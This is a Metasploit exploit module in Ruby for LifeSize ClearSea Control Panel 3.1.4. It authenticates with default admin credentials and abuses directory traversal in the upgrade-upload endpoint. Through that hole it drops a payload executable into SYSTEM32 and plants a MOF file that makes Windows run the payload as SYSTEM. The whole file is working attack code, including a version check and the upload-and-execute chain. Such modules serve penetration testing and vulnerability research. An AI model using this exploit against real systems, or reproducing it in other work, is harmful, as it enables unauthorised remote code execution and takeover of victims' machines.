##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'LifeSize ClearSea Control Panel Authenticated RCE via File Upload',
      'Description'    => %q{
        This module exploits an arbitrary file upload vulnerability in LifeSize
        ClearSea Control Panel 3.1.4. When authenticated as admin, the Software
        Upgrade component allows attacker to upload malicious file onto arbitrary
        location due to a directory traversal vulnerability, which leads to remote
        code execution as SYSTEM user.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rsp3ar <lukunming[at]gmail.com>' # Discovery/Metasploit Module
        ],
      'References'     =>
        [
          ['EDB', '44390']
        ],
      'Payload'        =>
        {
          'DisableNops' => true
        },
      'Platform'       => 'win',
      'Arch'           => ARCH_X86,
      'Targets'        =>
        [
          ['LifeSize ClearSea Control Panel 3.1.4 / Windows XP Embedded', {}]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 31 2018'))

    register_options(
      [
        Opt::RPORT(8800),
        OptInt.new('DEPTH', [true, 'Traversal depth', 8]),
        OptString.new('USER', [true, 'Admin Username', 'admin']),
        OptString.new('PASS', [true, 'Admin Password', 'admin'])
      ])
    register_advanced_options [
      OptBool.new('ForceExploit', [true, 'Override check result', false])
    ]
  end

  def traversal
    "..\\" * datastore['DEPTH']
  end

  def login(user, pass)
    print_status("Authenticating as user '#{user}'...")
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => normalize_uri('/')
      })
    rescue Rex::ConnectionError, Errno::ENOTCONN => e
      vprint_error(e.message)
      return false
    end

    @cookie = res.get_cookies

    begin
      res = send_request_cgi({
        'method'    => 'POST',
        'uri'       => normalize_uri('smartgui', '/'),
        'vars_post' => {
          'smartGuiAuthenticate' => 't',
          'email'                => user,
          'password'             => pass
        },
        'cookie'    => @cookie
      })
    rescue Rex::ConnectionError, Errno::ENOTCONN => e
      vprint_error(e.message)
      return false
    end

    @cookie << res.get_cookies
    vprint_status("Cookie: #{@cookie}")

    unless @cookie.include? 'smartguiSessionID'
      vprint_error('Authentication failed.')
      return false
    end

    print_status("Successfully authenticated as user '#{user}'")
    true
  end

  def upload(file_path, contents)
    boundary = rand_text_alpha(30)
    body = []
    body << "\r\n--#{boundary}\r\n"
    body << "Content-Disposition: form-data; name=\"SmartGuiUploadField\"; filename=\"#{rand_text_alpha(5)}.txt\"\r\n"
    body << "Content-Type: text/plain\r\n\r\n"
    body << contents
    body << "\r\n\r\n--#{boundary}--\r\n"

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('smartgui', 'upload', '-m-ClearSea-c-DHP_PKG_UPLOAD_FORM-w-filename', rand_text_alpha(10), file_path),
      'ctype' => "multipart/form-data, boundary=#{boundary}",
      'cookie' => @cookie,
      'data' => body.join
    })
  end

  def exploit
    unless CheckCode::Vulnerable == check
      unless datastore['ForceExploit']
        fail_with(Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.')
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    print_status("Generating .exe payload...")
    exe_name = "#{rand_text_alpha(5..10)}.exe"
    exe_content = generate_payload_exe
    exe_file_path = "#{traversal}WINDOWS\\SYSTEM32\\#{exe_name}"
    print_status("Uploading .exe payload #{exe_name}...")
    upload(exe_file_path, exe_content)
    register_file_for_cleanup(exe_name)

    print_status("Generating .mof file...")
    mof_name = "#{rand_text_alpha(5..10)}.mof"
    mof_content = generate_mof(mof_name, exe_name)
    mof_file_path = "#{traversal}WINDOWS\\SYSTEM32\\WBEM\\MOF\\#{mof_name}"
    print_status("Uploading .mof file #{mof_name}...")
    upload(mof_file_path, mof_content)
    register_file_for_cleanup("WBEM\\MOF\\GOOD\\#{mof_name}")
  end

  def check
    unless login(datastore['USER'], datastore['PASS'])
      return CheckCode::Unknown
    end

    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri('smartgui', 'sessionService'),
        'ctype' => 'text/x-gwt-rpc; charset=utf-8',
        'cookie' => @cookie,
        'data' => '5|0|4|||com.manthia.gui.metadata.client.SessionService|beginSession|1|2|3|4|0|'
      })
    rescue Rex::ConnectionError, Errno::ENOTCONN => e
      return CheckCode::Unknown
    end

    session_token = res.body.scan(/"([^"]*)"/)[8].first
    vprint_status("Obtained smartgui session token #{session_token}")

    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri('smartgui', 'formService'),
        'ctype' => 'text/x-gwt-rpc; charset=utf-8',
        'cookie' => @cookie,
        'data' => "5|0|7|||com.manthia.gui.metadata.client.FormService|load|java.lang.String|#{session_token}|-m-ClearSea-c-SYSTEM_STATUS_FORM|1|2|3|4|2|5|5|6|7|"
      })
    rescue Rex::ConnectionError, Errno::ENOTCONN => e
      return CheckCode::Unknown
    end

    if res && res.body.include?('3.1.4')
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end
end
